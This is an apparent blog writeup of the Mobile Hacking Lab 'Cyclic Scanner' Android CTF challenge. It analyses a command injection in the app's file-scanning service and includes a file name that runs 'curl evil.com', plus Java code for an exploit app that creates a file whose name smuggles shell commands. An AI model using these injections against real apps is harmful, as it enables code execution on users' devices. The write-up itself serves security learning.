---
title:  "Mobile Hacking Lab Cyclic Scanner Writeup"
date:   2024-01-22T16:41:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for Cyclic Scanner challenge from Mobile Hacking Lab. 

## Static Analysis
Application have only MainActivity activity and this activity have a switch for activating a service.
Let's analyse code with jadx.
![](/assets/images_mhl_cyclicscanner/1.png)

When the manifest file is examined, some remarkable information is obtained.
- It can be predicted that it will perform file operations on external storage by requesting the MANAGE_EXTERNAL_STORAGE permission.
- Indicates that it will define a user-noticeable service (showing a notification in the status bar) using the FOREGROUND_SERVICE permission. (ScanService defined as service in manifest file.)

![](/assets/images_mhl_cyclicscanner/2.png)

When the codes of the MainActivity activity are examined, it is seen that if the key button shown to the user on the screen is activated, the scanning service starts and then an intent is sent to the ScanService service.

![](/assets/images_mhl_cyclicscanner/3.png)

When the codes of the ScanService service are examined, it is seen that when the service is started, it scans the files in the external storage and sends these files to the scanFile method in the ScanEngine class. Depending on the value returned from this method, whether the file is safe or infected is written to the logcat.

![](/assets/images_mhl_cyclicscanner/4.png)

The scanFile method calculates the sha1 hash value of the File object sent to it and checks whether it is one of the known malicious files. However, there is a command injection vulnerability here because the file location is added to the command string to be executed without any checking or cleaning process.

For example:
```
test.txt ; curl evil.com
```
If we set that string as the name of a file on an external storage, this name is added after the toybox command with “;” The commands left behind the sign are executed and a request is sent to evil.com. Any command can be run here within the scope of file name restrictions in the Android operating system. If you want to prepare a malicious application that creates the necessary file for the command to be run, the following piece of code can be used as an example:

```java
public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (checkPermission()) {
            createTestFile();
        } else {
            requestPermission();
        }
    }

    private boolean checkPermission() {
        int writeExternalStoragePermission = ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE);
        return writeExternalStoragePermission == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                createTestFile();
            } else {
                Toast.makeText(getApplicationContext(), "Permission Denied!", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void createTestFile() {
        // your payload here:
        String fileName = "test.txt; mkdir hacked; cd hacked; touch pwnedddd ";

        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),fileName);

        try {
            boolean created = file.createNewFile();
            if (created) {
                Toast.makeText(getApplicationContext(), "File created: " + file.getAbsolutePath(), Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(getApplicationContext(), "File already exists: " + file.getAbsolutePath(), Toast.LENGTH_LONG).show();
            }
        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), "Failed to create file!", Toast.LENGTH_SHORT).show();
        }
    }

}

```
Don't forget to add 

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
```

permission to the manifest file so that files can be created in external storage.

[![](https://img.youtube.com/vi/-Mx9lSTS57s/0.jpg)](https://youtu.be/-Mx9lSTS57s)

Thanks for reading! See you in next writeups 👋🏻👋🏻
